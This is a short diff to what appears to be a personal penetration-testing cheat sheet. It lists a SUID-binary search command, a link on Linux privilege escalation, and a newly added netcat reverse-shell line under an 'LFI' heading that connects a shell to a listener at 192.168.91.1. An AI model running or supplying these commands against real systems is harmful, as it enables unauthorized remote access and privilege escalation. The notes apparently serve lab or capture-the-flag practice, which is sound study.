@@ -32,3 +32,10 @@ few scripts and useful commands
 <li>find / -perm +6000 2> /dev/null</li>
 <li>https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</li>
 </ul>
+
+# shell
+
+<p>LFI</p>
+<ul>
+<li>/bin/nc 192.168.91.1 1234 -e /bin/sh /bin</li>
+</ul>
